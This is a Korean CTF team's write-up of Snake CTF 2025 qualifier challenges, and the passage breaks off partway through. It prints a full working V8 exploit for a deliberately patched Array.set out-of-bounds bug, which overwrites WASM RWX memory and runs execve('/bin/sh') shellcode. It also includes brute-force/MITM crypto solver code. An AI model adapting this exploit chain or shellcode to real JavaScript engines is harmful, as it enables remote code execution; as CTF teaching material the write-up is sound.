---
title: Snake CTF 2025 예선 풀이
description: Snake CTF 2025 예선 풀이입니다
author: Hypersonic
date: 2025-09-16
tags: [CTF]
categories: [CTF]
math: true
mermaid: false
pin: false
image:
---

# Snake CTF 2025 예선 풀이

### 박종휘(Wane), 조수호(shielder) , 이정훈(히히망함) , 김건호(Kio) , 김우진(Waivey) , 전영현(n0ha) , 가세혁(dpp) , 이재영(Finder) , 김여름(xdfyrj)

### 목차
1. 서론

2. PWN
- is this web?
3. Crypto
- Triple-Flavor
- scr4mbl3d
- unf33dme
- Free Start
4. REV
- Saturn
- Parallel Flagging
- Odnet Nin
5. WEB
- SPAM
- /b/locked
- Boxbin
- exploitme
6. Misc
- Closed Web Net 2

# 서론
청소년 해킹팀 our team name was stolen은 팀명을 hypersonic으로 변경한 이후 처음 출전한 대회에서 본선 진출에 성공하였습니다.  
Snake CTF 2025는 MadrHacks에서 주최한 대회로, 2025년 8월 29일부터 8월 31일까지(UTC 기준) 온라인 예선이 진행되었습니다. 본 대회에는 hypersonic 팀의 김건호(kio), 박진우(jwp22), 전영현(n0ha), 가세혁(dpp), 김여름(xdfyrj), 김승찬(Zoodasa), 조수호(shielder), 이정훈(히히망함), 박종휘(wane), 박도원(Void), 김우진(Waivey) , 이재영(Finder)가 참가하였으며, 치열한 경쟁 끝에 예선 8위라는 우수한 성적을 거두어 본선에 진출하게 되었습니다.  
이건우(Cheshire) , 박도원(xdfyrj) , 김여름(void) , 정건우(P1ain) 팀을 대표하여 이탈리아 Lignano Sabbiadoro에서 참가할 예정입니다. 


# PWN
## is this web?
### Analysis
문제를 확인하면 `d8`, `args.gn`, `patch`, `REVISION`, `DockerFile` 등을 확인할 수 있다. <br>
이를 보았을 때 대표적인 v8 exploit 문제임을 직감할 수 있다. <br>
가장 먼저 확인해 보아야하는 점은 v8의 버전이나 컴파일 옵션이다. 따라서 `args.gn`, `args.gn`를 보면 된다.

<br>

**args.gn:**
```sh
is_component_build = false
is_debug = false
target_cpu = "x64"
v8_enable_sandbox = false
v8_enable_backtrace = true
v8_enable_disassembler = true
v8_enable_object_print = true
dcheck_always_on = false
use_goma = false
v8_code_pointer_sandboxing = false
```

`args.gn`을 확인하면 `v8_enable_sandbox`, `v8_code_pointer_sandboxing`가 `false`로 설정 되어 있다. <br>
sandbox가 모두 꺼져있으므로 heap leak, code pointer overwrite 등 다양한 rip control primitive가 존재할 것이라 생각된다.

<br>

REVISION: 
```
deb1106598dc8c3a6284268f7d8ffac805abd96c
```
git commit은 다음과 같다. <br>
d8을 실행해 확인하면 `14.1.0` 임을 알 수 있다.

<br>

patch: 
```cpp
diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index a268f75d96c..debffe31396 100644
--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -514,6 +514,61 @@ BUILTIN(ArrayPush) {
   return *isolate->factory()->NewNumberFromUint((new_length));
 }
 
+BUILTIN(ArraySet) {
+  HandleScope scope(isolate);
+  Factory* factory = isolate->factory();
+  Handle<Object> receiver = args.receiver();
+
+  if (!IsJSArray(*receiver) ||
+      !HasOnlySimpleReceiverElements(isolate, Cast<JSArray>(*receiver)) ||
+      args.length() != 3) {
+    THROW_NEW_ERROR_RETURN_FAILURE(
+        isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+                              factory->NewStringFromAsciiChecked("Nope")));
+  }
+
+  Tagged<Object> arg1 = *args.at(1);
+  Tagged<Object> arg2 = *args.at(2);
+
+  if (!IsJSArray(arg1) ||
+      !HasOnlySimpleReceiverElements(isolate, Cast<JSObject>(arg1)) ||
+      !IsNumber(arg2)) {
+    THROW_NEW_ERROR_RETURN_FAILURE(
+        isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+                              factory->NewStringFromAsciiChecked("Nope")));
+  }
+
+  Handle<JSArray> array = Cast<JSArray>(receiver);
+  Tagged<JSArray> values = Cast<JSArray>(arg1);
+
+  if (array->GetElementsKind() != PACKED_DOUBLE_ELEMENTS ||
+      values->GetElementsKind() != PACKED_DOUBLE_ELEMENTS) {
+    THROW_NEW_ERROR_RETURN_FAILURE(
+        isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+                              factory->NewStringFromAsciiChecked("Nope")));
+  }
+
+  int32_t start_index = Object::NumberValue(*args.at(2));
+
+  int32_t values_length =
+      static_cast<int32_t>(Object::NumberValue(values->length()));
+  int32_t array_length =
+      static_cast<int32_t>(Object::NumberValue(array->length()));
+
+  CHECK_LE(start_index + values_length, array_length);
+
+  Tagged<FixedDoubleArray> values_elements =
+      Cast<FixedDoubleArray>(values->elements());
+  Tagged<FixedDoubleArray> array_elements =
+      Cast<FixedDoubleArray>(array->elements());
+  for (int32_t i = start_index; i < start_index + values_length; i++) {
+    double value =
+        values_elements->get_scalar(static_cast<int>(i - start_index));
+    array_elements->set(i, value);
+  }
+  return ReadOnlyRoots(isolate).undefined_value();
+}
+
 namespace {
 
 V8_WARN_UNUSED_RESULT Tagged<Object> GenericArrayPop(Isolate* isolate,
diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
index b811b38a88f..c6bbcce109f 100644
--- a/src/builtins/builtins-definitions.h
+++ b/src/builtins/builtins-definitions.h
@@ -483,6 +483,7 @@ constexpr int kGearboxGenericBuiltinIdOffset = -2;
       ArraySingleArgumentConstructor)                                          \
   TFC(ArrayNArgumentsConstructor, ArrayNArgumentsConstructor)                  \
   CPP(ArrayConcat, kDontAdaptArgumentsSentinel)                                \
+  CPP(ArraySet, JSParameterCount(2))                                           \
   /* ES6 #sec-array.prototype.fill */                                          \
   CPP(ArrayPrototypeFill, kDontAdaptArgumentsSentinel)                         \
   /* ES7 #sec-array.prototype.includes */                                      \
diff --git a/src/compiler/turbofan-typer.cc b/src/compiler/turbofan-typer.cc
index e1bf3d1062c..ec21eb880db 100644
--- a/src/compiler/turbofan-typer.cc
+++ b/src/compiler/turbofan-typer.cc
@@ -2042,6 +2042,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
       return Type::Receiver();
     case Builtin::kArrayUnshift:
       return t->cache_->kPositiveSafeInteger;
+    case Builtin::kArraySet:
+      return Type::Receiver();
 
     // ArrayBuffer functions.
     case Builtin::kArrayBufferIsView:
diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index 875c5695732..31f41de445b 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
@@ -4025,6 +4025,7 @@ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   global_template->Set(isolate, "version",
                        FunctionTemplate::New(isolate, Version));
 
+  /*
   global_template->Set(isolate, "print", FunctionTemplate::New(isolate, Print));
   global_template->Set(isolate, "printErr",
                        FunctionTemplate::New(isolate, PrintErr));
@@ -4065,10 +4066,12 @@ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
     global_template->Set(isolate, "async_hooks",
                          Shell::CreateAsyncHookTemplate(isolate));
   }
+  */
 
   return global_template;
 }
 
+/*
 Local<ObjectTemplate> Shell::CreateOSTemplate(Isolate* isolate) {
   Local<ObjectTemplate> os_template = ObjectTemplate::New(isolate);
   AddOSMethods(isolate, os_template);
@@ -4081,6 +4084,7 @@ Local<ObjectTemplate> Shell::CreateOSTemplate(Isolate* isolate) {
       PropertyAttribute::ReadOnly);
   return os_template;
 }
+*/
 
 Local<FunctionTemplate> Shell::CreateWorkerTemplate(Isolate* isolate) {
   Local<FunctionTemplate> worker_fun_template =
@@ -4993,9 +4997,12 @@ void Shell::ReadLine(const v8::FunctionCallbackInfo<v8::Value>& info) {
   info.GetReturnValue().Set(ReadFromStdin(info.GetIsolate()));
 }
 
+bool antiCheeseHopefullyWorksDunno = false;
+
 // Reads a file into a memory blob.
 std::unique_ptr<base::OS::MemoryMappedFile> Shell::ReadFileData(
     Isolate* isolate, const char* name, bool should_throw) {
+  if (antiCheeseHopefullyWorksDunno) return nullptr;
   std::unique_ptr<base::OS::MemoryMappedFile> file(
       base::OS::MemoryMappedFile::open(
           name, base::OS::MemoryMappedFile::FileMode::kReadOnly));
@@ -5007,6 +5014,7 @@ std::unique_ptr<base::OS::MemoryMappedFile> Shell::ReadFileData(
     }
     return nullptr;
   }
+  antiCheeseHopefullyWorksDunno = true;
   return file;
 }
 
diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
index 07f091ea275..55a14144656 100644
--- a/src/init/bootstrapper.cc
+++ b/src/init/bootstrapper.cc
@@ -2416,6 +2416,8 @@ void Genesis::InitializeGlobal(DirectHandle<JSGlobalObject> global_object,
 
     SimpleInstallFunction(isolate_, proto, "at", Builtin::kArrayPrototypeAt, 1,
                           kAdapt);
+    SimpleInstallFunction(isolate_, proto, "set", Builtin::kArraySet, 2,
+                          kAdapt);
     SimpleInstallFunction(isolate_, proto, "concat",
                           Builtin::kArrayPrototypeConcat, 1, kDontAdapt);
     SimpleInstallFunction(isolate_, proto, "copyWithin",
```

`patch`파일을 확인하면 `builtins-array.cc`에 BUILTIN 함수인 `ArraySet`이 추가된 것을 확인할 수 있다. <br>
이는 아래와 같은 코드로 해당 함수를 실행시킬 수 있다.

```js
let arr1 = new Array(10).fill(1.1);
let arr2 = [2.2];

arr1.set(arr2, 1);
```

### Vulnerability
취약점은 간단하다. <br>
어디에도 arg2 값에 대한 검증이 존재하지 않는다. 단지, `IsNumber`이면 된다.

```cpp
+  Tagged<Object> arg1 = *args.at(1);
+  Tagged<Object> arg2 = *args.at(2);
+
+  if (!IsJSArray(arg1) ||
+      !HasOnlySimpleReceiverElements(isolate, Cast<JSObject>(arg1)) ||
+      !IsNumber(arg2)) {
+    THROW_NEW_ERROR_RETURN_FAILURE(
+        isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+                              factory->NewStringFromAsciiChecked("Nope")));
+  }
```

따라서, 아래와 같은 코드로 `oob`가 발생한다.

```js
let arr1 = new Array(10).fill(1.1);
let arr2 = [2.2];

arr1.set(arr2, -1);
```

### Exploit
`oob`가 발생하므로 간단하게 `JSArray`의 `length` 필드를 조작하고, `elements` 필드를 변조해서 `car`, `caw`를 만들 수 있다. <br>
`14.1.0` 버전에서는 `WasmInstanceObject`에 `jump_table_start`이 보이지 않는다. 이는 `WASM_TRUSTED_INSTANCE_DATA_TYPE` 패치가 적용되었기 때문이다.
하지만, `trusted_data` 내부에 `jump_table_start`이 남아 있고, 이를 leak하는 것은 가능하다.
이 과정을 거치면 caw를 가지고 `jump_table_start`이 가르키는 `rwx` 영역을 덮을 수 있다.
함수를 실행 했을 때 뛰는 부분을 확인하기 위해 아래와 같이 `rwx` 영역을 A로 덮고 WASM을 실행하면 넘어가는 주소를 알 수 있다.

```
pwndbg> call memset((void*)<jump_table_start>, 0x41, 0x1000)
```

이를 통해 확인한 wasm start offset이 `0xa00` 이었고, 해당 부분에 shellcode를 삽입하여 shell을 획득할 수 있다.

### Full Exploit Code

```js
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new BigUint64Array(buf);
var u32_buf = new Uint32Array(buf);

function gc() {
    for (var i = 0; i < 0x10000; ++i)
        var a = new ArrayBuffer();
}

function ftoi(val){
    f64_buf[0]=val;
    return u64_buf[0];
}

function itof(val){
    u64_buf[0] = val;
    return f64_buf[0];
}

function hex(val){
    return "0x" + val.toString(16)
}

function lo32(val){
    return val&0xffffffffn;
}

function hi32(val){
    return val >> 32n;
}

function d2u(v) {
    f64_buf[0] = v;
    return u32_buf;
}

function u2d(low,high) {
    u32_buf[0] = low;
    u32_buf[1] = high;

    return f64_buf[0];
}

var code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 8, 2, 96, 0, 1, 124, 96, 0, 0, 3, 3, 2, 0, 1, 7, 14, 2, 4, 109, 97, 105, 110, 0, 0, 3, 112, 119, 110, 0, 1, 10, 76, 2, 71, 0, 68, 104, 110, 47, 115, 104, 88, 235, 7, 68, 104, 47, 98, 105, 0, 91, 235, 7, 68, 72, 193, 224, 24, 144, 144, 235, 7, 68, 72, 1, 216, 72, 49, 219, 235, 7, 68, 80, 72, 137, 231, 49, 210, 235, 7, 68, 49, 246, 106, 59, 88, 144, 235, 7, 68, 15, 5, 144, 144, 144, 144, 235, 7, 26, 26, 26, 26, 26, 26, 11, 2, 0, 11]);
var module = new WebAssembly.Module(code);
var instance = new WebAssembly.Instance(module, {});
var wmain = instance.exports.main;
for (let j = 0x0; j < 100000; j++) {
    wmain()
}

function func() {
    return [1.9553825422107533e-246, 1.9560612558242147e-246, 1.9995714719542577e-246, 1.9533767332674093e-246, 2.6348604765229606e-284];
}
for (let i = 0; i < 20000; i++) func(0);

let dummy1= [2];
let target = [1.1, 2.2];
dummy1.push(3);
let arr_1 = new Array(10).fill(1.1);
let arr_2 = [itof(0x00001e100001000n)];
var temp_obj = {"A":1};
var obj_arr = [temp_obj];
let array_buffer = new ArrayBuffer(0x100);

console.log(target[1]);

arr_1.set(arr_2, -28);

console.log(target.length);
console.log(hex(ftoi(target[16])));
console.log("##################");

let ele_addr = hi32(ftoi(target[16]));

console.log("ele_addr: " + hex(ele_addr));

obj_arr[0] = instance;

let instance_addr = hi32(ftoi(target[64]));

let val1 = itof(lo32(ftoi(target[16])) + (instance_addr << 32n));
target[16] = val1;

let trusted_data = hi32(ftoi(arr_1[0]));
console.log("trusted_data: " + hex(trusted_data));

val1 = itof(lo32(ftoi(target[16])) + (trusted_data << 32n));
target[16] = val1;

let jump_table_start = ftoi(arr_1[4]);
console.log("jump_table_start: " + hex(jump_table_start));

obj_arr[0] = array_buffer;

let array_buffer_addr = hi32(ftoi(target[64]));
console.log("array_buffer_addr: " + hex(array_buffer_addr));

val1 = itof(lo32(ftoi(target[16])) + (array_buffer_addr << 32n));
let val2 = itof(((hi32(ftoi(target[17]))<<32n)+0x00001000n));

target[16] = val1;
target[17] = val2;

let heap = hi32(ftoi(arr_1[3]));
heap += (lo32(ftoi(arr_1[4]))<<32n);
console.log("heap: " + hex(heap));

arr_1[3] = itof(lo32(ftoi(arr_1[3])) + (lo32(jump_table_start+0xa00n)<<32n));
arr_1[4] = itof((hi32(ftoi(arr_1[4]))<<32n) + hi32(jump_table_start));

let shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x48\x31\xc0\xb0\x3b\x99\x4d\x31\xd2\x0f\x05";

let sub_buf = new Uint8Array(array_buffer);
for(let i = 0; i < shellcode.length; i++) {
    sub_buf[i] = shellcode[i].charCodeAt();
}

console.log("run wmain");
wmain();
```





# Crypto
# Triple-Flavor

```python
TIMEOUT = environ.get("TIMEOUT", 300)
SECRET_LEN = 15
key_len = SECRET_LEN // 3
secret_token = ''.join([choice(ascii_lowercase + digits) for _ in range(SECRET_LEN)])
seeds = [secret_token[i:i+key_len] for i in range(0, len(secret_token), key_len)]
keys = [sha256(seed.encode()).digest()[:16] for seed in seeds]
ivs = [urandom(16), urandom(16)]

def encrypt(pt:bytes, keys:list, ivs:list) -> bytes:
    cipher1 = AES.new(keys[0], AES.MODE_ECB)
    cipher2 = AES.new(keys[1], AES.MODE_OFB, ivs[0])
    cipher3 = AES.new(keys[2], AES.MODE_CBC, ivs[1])

    ct1 = cipher1.encrypt(pad(pt, 16))
    ct2 = cipher2.encrypt(ct1)
    twks = [sha256(ivs[1] + i.to_bytes(1, 'big')).digest()[:16] for i in range(0, len(ct2)//16)]
    ct3 = cipher3.decrypt(xor(ct2, b''.join(twks)))

    return ct3
```
알파벳 소문자와 숫자들을 이용해 `secret_token`을 생성한 후, 세 부분으로 나누어 AES key를 생성한다. 이때 각 key는 5개의 문자에 SHA256을 통해 16byte로 변환되기 때문에, 총 $36^{5}$개의 경우가 존재한다. 이는 서버의 타임아웃인 300초안에 충분히 가능하며, MITM을 이용하면 $36^{10}$까지 가능하다(물론 멀티스레딩 등 최적화는 필요하다).
두개의 동일한 블록으로 구성된 평문을 입력하게 되면(PT0 PT0) ECB 암호화 결과에선 동일한 블록(CT0 CT0)이 나올 것이고, OFB 암호화 결과 및 twks와 연산한 결과에선 CT0 ^ K ^ twks0, CT0 ^ E(K) ^ twks1이 될 것이다. 이 둘을 XOR하면 CT0이 소거되어 K ^ E(K) ^ twks0 ^ twks1이 된다. MITM을 위해 OFB mode의 key에 대해 가능한 모든 경우를 저장한다.

따라서 CBC mode에 사용된 key를 브루트포싱하는데, 만약 주어진 key와 iv를 이용해 암호화한 두 블록을 XOR한 값이 저장된 값과 일치한다면 이때의 CBC mode의 key와 OFB mode의 key가 실제 사용된 것임을 알 수 있고, 이로부터 `secret_token`의 15글자 중 10글자를 복구할 수 있다.

또한 두 단계에서 사용된 key를 앎으로 CT0를 복구할 수 있고, 다시 ECB mode의 key를 브루트포싱하여 `secret_token`의 남은 5글자도 복구할 수 있다.

ex.py
```python
from pwn import *
import time

context.log_level = 'debug'

start_time = time.time()
#serv = process(['python3', 'server.py'])
serv = remote('triple-flavor.challs.snakectf.org', 1337, ssl=True)
serv.sendlineafter(b'team token: ', b'5cdf5a7482d239e5cd8bb8c3ec204b2d')
serv.sendlineafter(b'): ', b'00' * 32)
serv.recvuntil(b'Ciphertext (in hex): ')
msg1 = serv.recvn(128)
# serv.interactive()
p = process('./exreal2')
p.sendline(msg1)
while True:
    msg = p.recvline()
    if b'YES' in msg:
        break
    print(msg)
end_time = time.time()
elapsed_time = end_time - start_time
print(f"코드 실행 시간: {elapsed_time:.4f}초")
#p.interactive()
from hashlib import sha256
from Crypto.Cipher import AES

def xor(a:bytes, b:bytes):
    return bytes([x ^ y for x,y in zip(a, b)])

st3 = p.recvn(5)
print(st3)
ivs = [bytes.fromhex(msg1[:32].decode()), bytes.fromhex(msg1[32:64].decode())]
twks = [sha256(ivs[1] + i.to_bytes(1, 'big')).digest()[:16] for i in range(2)]
key = sha256(st3).digest()[:16]
cipher3 = AES.new(key, AES.MODE_CBC, ivs[1])
pt2 = cipher3.encrypt(bytes.fromhex(msg1[64:][:64].decode()))
pt2 = xor(pt2, b''.join(twks))

p.recvline()
st2 = p.recvn(5)
print(st2)
key = sha256(st2).digest()[:16]
cipher2 = AES.new(key, AES.MODE_OFB, ivs[0])
pt1 = cipher2.decrypt(pt2)
print(pt1.hex())
p.close()

p = process('./ex_ecb')
p.sendlineafter(b'Enter plaintext (32 hex chars for 16 bytes): ', b'00' * 16)
p.sendlineafter(b'Enter ciphertext (32 hex chars for 16 bytes): ', str(pt1.hex()[:32]).encode())
p.recvuntil(b'SUCCESS! Key found: ')
st1 = p.recvn(5)
serv.sendlineafter(b'Give me your guess: ', st1 + st2 + st3)
serv.interactive()
'''
00000000000000000000000000000000
d1829331f5332834776c3ee03390e011
d1829331f5332834776c3ee03390e011
'''
```
MITM
```C
#include <iostream>
#include <string>
#include <vector>
#include <unordered_map>
#include <cstring>
#include <iomanip>
#include <sstream>
#include <thread>
#include <mutex>
#include <atomic>
#include <chrono>
#include <openssl/aes.h>
#include <openssl/sha.h>
#include <openssl/evp.h>

using namespace std;

// Global variables for thread coordination
atomic<int> global_counter(0);
const int REPORT_INTERVAL = 1000000;

// Helper function to convert hex string to bytes
vector<uint8_t> hexToBytes(const string& hex) {
    vector<uint8_t> bytes;
    for (size_t i = 0; i < hex.length(); i += 2) {
        string byteString = hex.substr(i, 2);
        uint8_t byte = (uint8_t)strtol(byteString.c_str(), nullptr, 16);
        bytes.push_back(byte);
    }
    return bytes;
}

// XOR two byte arrays
vector<uint8_t> xorBytes(const vector<uint8_t>& a, const vector<uint8_t>& b) {
    vector<uint8_t> result;
    size_t minSize = min(a.size(), b.size());
    for (size_t i = 0; i < minSize; i++) {
        result.push_back(a[i] ^ b[i]);
    }
    return result;
}

// SHA256 hash function
vector<uint8_t> sha256Hash(const vector<uint8_t>& data) {
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256(data.data(), data.size(), hash);
    return vector<uint8_t>(hash, hash + SHA256_DIGEST_LENGTH);
}

// AES OFB mode encryption
vector<uint8_t> aesOfbEncrypt(const vector<uint8_t>& key, const vector<uint8_t>& iv, const vector<uint8_t>& plaintext) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    vector<uint8_t> ciphertext(plaintext.size());
    int len;
    int ciphertext_len;
    
    EVP_EncryptInit_ex(ctx, EVP_aes_128_ofb(), NULL, key.data(), iv.data());
    EVP_EncryptUpdate(ctx, ciphertext.data(), &len, plaintext.data(), plaintext.size());
    ciphertext_len = len;
    EVP_EncryptFinal_ex(ctx, ciphertext.data() + len, &len);
    
    EVP_CIPHER_CTX_free(ctx);
    return ciphertext;
}

// AES CBC mode encryption
vector<uint8_t> aesCbcEncrypt(const vector<uint8_t>& key, const vector<uint8_t>& iv, const vector<uint8_t>& plaintext) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    vector<uint8_t> ciphertext(plaintext.size() + AES_BLOCK_SIZE);
    int len;
    int ciphertext_len;
    
    EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key.data(), iv.data());
    EVP_CIPHER_CTX_set_padding(ctx, 0); // No padding
    EVP_EncryptUpdate(ctx, ciphertext.data(), &len, plaintext.data(), plaintext.size());
    ciphertext_len = len;
    EVP_EncryptFinal_ex(ctx, ciphertext.data() + len, &len);
    ciphertext_len += len;
    
    EVP_CIPHER_CTX_free(ctx);
    ciphertext.resize(ciphertext_len);
    return ciphertext;
}

// Generate all combinations of given length
void generateCombinations(const string& charset, int length, vector<string>& results) {
    string current(length, charset[0]);
    
    while (true) {
        results.push_back(current);
        
        // Generate next combination
        int pos = length - 1;
        while (pos >= 0) {
            size_t charPos = charset.find(current[pos]);
            if (charPos < charset.length() - 1) {
                current[pos] = charset[charPos + 1];
                break;
            } else {
                current[pos] = charset[0];
                pos--;
            }
        }
        
        if (pos < 0) break; // All combinations generated
    }
}

// Custom hash function for vector<uint8_t> as map key
struct VectorHash {
    size_t operator()(const vector<uint8_t>& v) const {
        size_t seed = v.size();
        for (auto& i : v) {
            seed ^= i + 0x9e3779b9 + (seed << 6) + (seed >> 2);
        }
        return seed;
    }
};

// Thread worker function for building dictionary
void buildDictionaryWorker(
    const vector<string>& combinations,
    size_t start_idx,
    size_t end_idx,
    unordered_map<vector<uint8_t>, string, VectorHash>& local_dict,
    const vector<uint8_t>& iv0,
    const vector<uint8_t>& iv1,
    int thread_id
) {
    cout << "Thread " << thread_id << " starting: processing indices " << start_idx << " to " << end_idx - 1 << endl;
    
    vector<uint8_t> zeros16(16, 0);
    int local_count = 0;
    
    for (size_t idx = start_idx; idx < end_idx; idx++) {
        const string& st = combinations[idx];
        
        // Convert string to bytes and hash
        vector<uint8_t> strBytes(st.begin(), st.end());
        vector<uint8_t> keyHash = sha256Hash(strBytes);
        vector<uint8_t> key(keyHash.begin(), keyHash.begin() + 16);
        
        // First AES OFB encryption
        vector<uint8_t> enc = aesOfbEncrypt(key, iv0, zeros16);
        
        // Second AES OFB encryption with enc as IV
        vector<uint8_t> key_enc = aesOfbEncrypt(key, enc, zeros16);
        
        // Generate twks
        vector<vector<uint8_t>> twks;
        for (int i = 0; i < 2; i++) {
            vector<uint8_t> temp = iv1;
            temp.push_back((uint8_t)i);
            vector<uint8_t> hash = sha256Hash(temp);
            twks.push_back(vector<uint8_t>(hash.begin(), hash.begin() + 16));
        }
        
        // Calculate dictionary key
        vector<uint8_t> result = xorBytes(xorBytes(xorBytes(enc, key_enc), twks[0]), twks[1]);
        local_dict[result] = st;
        
        local_count++;
        
        // Update global counter and report progress
        int current = global_counter.fetch_add(1) + 1;
        if (current % REPORT_INTERVAL == 0) {
            cout << "Progress: " << current << " (Thread " << thread_id << ")" << endl;
        }
    }
    
    cout << "Thread " << thread_id << " completed: processed " << local_count << " combinations" << endl;
}

// Check if key exists in any of the dictionaries
bool findInDictionaries(
    const vector<uint8_t>& key,
    const vector<unordered_map<vector<uint8_t>, string, VectorHash>>& dicts,
    string& found_value
) {
    for (const auto& dict : dicts) {
        auto it = dict.find(key);
        if (it != dict.end()) {
            found_value = it->second;
            return true;
        }
    }
    return false;
}

int main() {
    // Number of threads for dictionary building
    const int NUM_THREADS = 8;  // You can change this to 4 or 8
    
    // Initialize variables
    string charset = "abcdefghijklmnopqrstuvwxyz0123456789";
    int length = 5;
    
    string a = "";
    cin >> a;
    
    vector<uint8_t> iv0 = hexToBytes(a.substr(0, 32));
    vector<uint8_t> iv1 = hexToBytes(a.substr(32, 32));
    vector<uint8_t> ct0 = hexToBytes(a.substr(64, 64)); // 192-64 = 128 characters
    
    // Generate all combinations
    cout << "Generating combinations..." << endl;
    auto start_time = chrono::high_resolution_clock::now();
    
    vector<string> combinations;
    generateCombinations(charset, length, combinations);
    
    cout << "Total combinations: " << combinations.size() << endl;
    
    // Phase 1: Build dictionary with multiple threads
    cout << "Building dictionary with " << NUM_THREADS << " threads..." << endl;
    
    vector<thread> threads;
    vector<unordered_map<vector<uint8_t>, string, VectorHash>> thread_dicts(NUM_THREADS);
    
    size_t chunk_size = combinations.size() / NUM_THREADS;
    size_t remainder = combinations.size() % NUM_THREADS;
    
    // Launch threads
    size_t current_start = 0;
    for (int i = 0; i < NUM_THREADS; i++) {
        size_t current_chunk = chunk_size + (i < remainder ? 1 : 0);
        size_t current_end = current_start + current_chunk;
        
        threads.emplace_back(
            buildDictionaryWorker,
            ref(combinations),
            current_start,
            current_end,
            ref(thread_dicts[i]),
            ref(iv0),
            ref(iv1),
            i
        );
        
        current_start = current_end;
    }
    
    // Wait for all threads to complete
    for (auto& t : threads) {
        t.join();
    }
    
    auto dict_time = chrono::high_resolution_clock::now();
    auto dict_duration = chrono::duration_cast<chrono::seconds>(dict_time - start_time);
    
    // Report dictionary sizes
    size_t total_dict_size = 0;
    for (int i = 0; i < NUM_THREADS; i++) {
        cout << "Dictionary " << i << " size: " << thread_dicts[i].size() << endl;
        total_dict_size += thread_dicts[i].size();
    }
    
    cout << "Total dictionary entries: " << total_dict_size << endl;
    cout << "Dictionary building time: " << dict_duration.count() << " seconds" << endl;
    cout << "Starting bruteforce (checking against " << NUM_THREADS << " dictionaries)" << endl;
    
    // Phase 2: Bruteforce - check against all dictionaries
    int cnt = 0;
    bool found = false;
    
    for (const auto& st : combinations) {
        // Convert string to bytes and hash
        vector<uint8_t> strBytes(st.begin(), st.end());
        vector<uint8_t> keyHash = sha256Hash(strBytes);
        vector<uint8_t> key(keyHash.begin(), keyHash.begin() + 16);
        
        // AES CBC encryption
        vector<uint8_t> pt0 = aesCbcEncrypt(key, iv1, ct0);
        
        // Calculate KK
        vector<uint8_t> pt0_first16(pt0.begin(), pt0.begin() + 16);
        vector<uint8_t> pt0_second16(pt0.begin() + 16, pt0.begin() + 32);
        vector<uint8_t> KK = xorBytes(pt0_first16, pt0_second16);
        
        // Check if KK exists in any of the dictionaries
        string found_value;
        if (findInDictionaries(KK, thread_dicts, found_value)) {
            cout << "YESSSS" << endl;
            cout << st << endl;
            cout << found_value << endl;
            found = true;
            // Optionally break here if you only need the first match
            // break;
        }
        
        cnt++;
        if (cnt % REPORT_INTERVAL == 0) {
            cout << "Bruteforce progress: " << cnt << endl;
        }
    }
    
    auto end_time = chrono::high_resolution_clock::now();
    auto total_duration = chrono::duration_cast<chrono::seconds>(end_time - start_time);
    
    cout << "Total execution time: " << total_duration.count() << " seconds" << endl;
    
    if (!found) {
        cout << "No matching keys found." << endl;
    }
    
    return 0;
}
```
ECB mode
```C
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <chrono>
#include <iomanip>
#include <sstream>
#include <openssl/aes.h>
#include <openssl/sha.h>
#include <openssl/evp.h>

using namespace std;

// Global variables for thread coordination
atomic<bool> key_found(false);
atomic<int> global_counter(0);
string found_key;
const int REPORT_INTERVAL = 1000000;

// Helper function to convert hex string to bytes
vector<uint8_t> hexToBytes(const string& hex) {
    vector<uint8_t> bytes;
    for (size_t i = 0; i < hex.length(); i += 2) {
        string byteString = hex.substr(i, 2);
        uint8_t byte = (uint8_t)strtol(byteString.c_str(), nullptr, 16);
        bytes.push_back(byte);
    }
    return bytes;
}

// Helper function to convert bytes to hex string
string bytesToHex(const vector<uint8_t>& bytes) {
    stringstream ss;
    ss << hex << setfill('0');
    for (const auto& byte : bytes) {
        ss << setw(2) << (int)byte;
    }
    return ss.str();
}

// SHA256 hash function
vector<uint8_t> sha256Hash(const vector<uint8_t>& data) {
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256(data.data(), data.size(), hash);
    return vector<uint8_t>(hash, hash + SHA256_DIGEST_LENGTH);
}

// AES ECB mode encryption (for single block)
vector<uint8_t> aesEcbEncrypt(const vector<uint8_t>& key, const vector<uint8_t>& plaintext) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    vector<uint8_t> ciphertext(plaintext.size() + AES_BLOCK_SIZE);
    int len;
    int ciphertext_len;
    
    EVP_EncryptInit_ex(ctx, EVP_aes_128_ecb(), NULL, key.data(), NULL);
    EVP_CIPHER_CTX_set_padding(ctx, 0); // No padding
    EVP_EncryptUpdate(ctx, ciphertext.data(), &len, plaintext.data(), plaintext.size());
    ciphertext_len = len;
    EVP_EncryptFinal_ex(ctx, ciphertext.data() + len, &len);
    ciphertext_len += len;
    
    EVP_CIPHER_CTX_free(ctx);
    ciphertext.resize(ciphertext_len);
    return ciphertext;
}

// Generate combinations for a given range
void generateCombinationsRange(const string& charset, int length, size_t start_idx, size_t end_idx, vector<string>& results) {
    size_t charset_size = charset.size();
    
    for (size_t idx = start_idx; idx < end_idx; idx++) {
        string combination(length, charset[0]);
        size_t temp = idx;
        
        // Convert index to combination
